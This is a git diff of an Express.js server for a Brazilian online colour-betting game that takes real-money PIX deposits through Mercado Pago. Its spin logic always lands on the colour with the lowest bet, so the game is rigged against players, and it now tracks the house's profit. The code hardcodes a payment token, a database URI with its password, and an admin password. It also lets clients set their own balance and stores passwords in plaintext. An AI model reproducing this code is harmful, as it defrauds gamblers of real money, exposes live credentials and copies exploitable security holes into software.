@@ -7,75 +7,104 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// CONFIGURAÇÕES
+// CONFIGURAÇÕES (PIX E BANCO)
 const MP_TOKEN = "APP_USR-480319563212549-011210-80973eae502f42ff3dfbc0cb456aa930-485513741";
 const MONGO_URI = "mongodb+srv://SlotReal:A1l9a9n7@cluster0.ap7q4ev.mongodb.net/SlotGame?retryWrites=true&w=majority";
 const SENHA_ADMIN = "76811867";
 
-mongoose.connect(MONGO_URI).then(() => console.log("💎 SLOTREAL ONLINE"));
+mongoose.connect(MONGO_URI).then(() => console.log("💎 SLOTREAL ONLINE E PIX ATIVO"));
 
 const User = mongoose.models.User || mongoose.model('User', new mongoose.Schema({
     user: { type: String, unique: true },
     pass: String,
     saldo: { type: Number, default: 0.00 },
-    bets: { type: [Number], default: [0,0,0,0,0,0,0,0,0,0] } // Guarda as apostas de cada cor
+    bets: { type: [Number], default: [0,0,0,0,0,0,0,0,0,0] }
 }));
 
-// TIMER DO JOGO
+const Stats = mongoose.models.Stats || mongoose.model('Stats', new mongoose.Schema({
+    lucroTotal: { type: Number, default: 0 }
+}));
+
+// TIMER
 let tempo = 30;
 setInterval(() => { if(tempo > 0) tempo--; else tempo = 30; }, 1000);
 app.get('/api/tempo-real', (req, res) => res.json({ segundos: tempo }));
 
-// SALVAR APOSTA (Muito importante para a lógica funcionar)
+// SALVAR SALDO E APOSTAS
 app.post('/api/save-saldo', async (req, res) => {
-    await User.findOneAndUpdate({ user: req.body.user }, { 
-        saldo: req.body.saldo, 
-        bets: req.body.bets 
-    });
+    await User.findOneAndUpdate({ user: req.body.user }, { saldo: req.body.saldo, bets: req.body.bets });
     res.json({ success: true });
 });
 
-// LÓGICA DO GIRO (AQUI ESTÁ O SEGREDO)
+// GERAR PIX (VOLTOU AO ORIGINAL QUE FUNCIONA)
+app.post('/gerar-pix', (req, res) => {
+    const postData = JSON.stringify({
+        transaction_amount: Number(req.body.valor),
+        description: `Dep_SlotReal_${req.body.user}`,
+        payment_method_id: "pix",
+        payer: { email: "gerente_vendas@email.com", first_name: req.body.user }
+    });
+
+    const options = {
+        hostname: 'api.mercadopago.com',
+        path: '/v1/payments',
+        method: 'POST',
+        headers: {
+            'Authorization': `Bearer ${MP_TOKEN}`,
+            'Content-Type': 'application/json',
+            'X-Idempotency-Key': Date.now().toString()
+        }
+    };
+
+    const mpReq = https.request(options, (mpRes) => {
+        let b = '';
+        mpRes.on('data', d => b += d);
+        mpRes.on('end', () => {
+            try {
+                const r = JSON.parse(b);
+                if (r.point_of_interaction) {
+                    res.json({ 
+                        success: true, 
+                        qr: r.point_of_interaction.transaction_data.qr_code_base64, 
+                        code: r.point_of_interaction.transaction_data.qr_code 
+                    });
+                } else {
+                    res.json({ success: false, msg: "Erro no Mercado Pago" });
+                }
+            } catch (e) { res.json({ success: false }); }
+        });
+    });
+    mpReq.on('error', (e) => res.json({ success: false }));
+    mpReq.write(postData);
+    mpReq.end();
+});
+
+// LÓGICA DO GIRO COM LUCRO
 app.post('/api/spin', async (req, res) => {
     const u = await User.findOne({ user: req.body.user });
     if(!u) return res.json({ success: false });
 
-    // 1. Acha qual cor teve a MENOR aposta
-    let menorValor = Math.min(...u.bets);
-    let opcoesGanhadoras = [];
-    
-    // 2. Se tiver empate em zero, ele escolhe qualquer uma que esteja zerada
-    u.bets.forEach((valor, indice) => {
-        if (valor === menorValor) opcoesGanhadoras.push(indice);
-    });
+    const totalApostado = u.bets.reduce((a, b) => a + b, 0);
+    let menor = Math.min(...u.bets);
+    let opcoes = [];
+    u.bets.forEach((v, i) => { if (v === menor) opcoes.push(i); });
 
-    // 3. Seleciona uma das cores perdedoras para o jogador (que é a ganhadora para a banca)
-    const corSorteada = opcoesGanhadoras[Math.floor(Math.random() * opcoesGanhadoras.length)];
-    
-    // 4. Calcula quanto o jogador ganha (se ele apostou na cor que caiu)
-    const valorApostadoNaCor = u.bets[corSorteada];
-    const ganho = Number((valorApostadoNaCor * 5).toFixed(2)); // Paga 5x o valor
-    
-    const novoSaldo = Number((u.saldo + ganho).toFixed(2));
+    const alvo = opcoes[Math.floor(Math.random() * opcoes.length)];
+    const ganho = Number((u.bets[alvo] * 5).toFixed(2));
+    const lucroRodada = totalApostado - ganho;
 
-    // 5. Zera as apostas para a próxima rodada e salva o saldo
-    await User.findOneAndUpdate({ user: u.user }, { 
-        $set: { saldo: novoSaldo, bets: [0,0,0,0,0,0,0,0,0,0] } 
-    });
+    await Stats.findOneAndUpdate({}, { $inc: { lucroTotal: lucroRodada } }, { upsert: true });
+    const nS = Number((u.saldo + ganho).toFixed(2));
+    await User.findOneAndUpdate({ user: u.user }, { $set: { saldo: nS, bets: [0,0,0,0,0,0,0,0,0,0] } });
 
-    res.json({ 
-        success: true, 
-        corAlvo: corSorteada, 
-        novoSaldo: novoSaldo, 
-        valorGanho: ganho 
-    });
+    res.json({ success: true, corAlvo: alvo, novoSaldo: nS, valorGanho: ganho });
 });
 
-// LOGIN E REGISTRO (Simplificado)
+// AUTH E ADMIN
 app.post('/auth/login', async (req, res) => {
     const c = await User.findOne({ user: req.body.user, pass: req.body.pass });
     if (c) res.json({ success: true, user: c.user, saldo: c.saldo, bets: c.bets });
-    else res.json({ success: false, msg: "Erro!" });
+    else res.json({ success: false });
 });
 
 app.post('/auth/register', async (req, res) => {
@@ -86,20 +115,17 @@ app.post('/auth/register', async (req, res) => {
     } catch (e) { res.json({ success: false }); }
 });
 
-// ADMIN E PIX (Mantidos)
 app.post('/api/admin/list', async (req, res) => {
     if(req.body.senha !== SENHA_ADMIN) return res.json({ success: false });
     const users = await User.find({}, 'user saldo');
-    res.json({ success: true, users });
+    const st = await Stats.findOne({});
+    res.json({ success: true, users, lucroBanca: st ? st.lucroTotal : 0 });
 });
 
 app.post('/api/admin/bonus', async (req, res) => {
     if(req.body.senha !== SENHA_ADMIN) return res.json({ success: false });
-    const u = await User.findOne({ user: req.body.user });
-    if(u) {
-        await User.findOneAndUpdate({ user: u.user }, { $inc: { saldo: req.body.valor } });
-        res.json({ success: true });
-    } else res.json({ success: false });
+    await User.findOneAndUpdate({ user: req.body.user }, { $inc: { saldo: req.body.valor } });
+    res.json({ success: true });
 });
 
 app.listen(process.env.PORT || 10000);
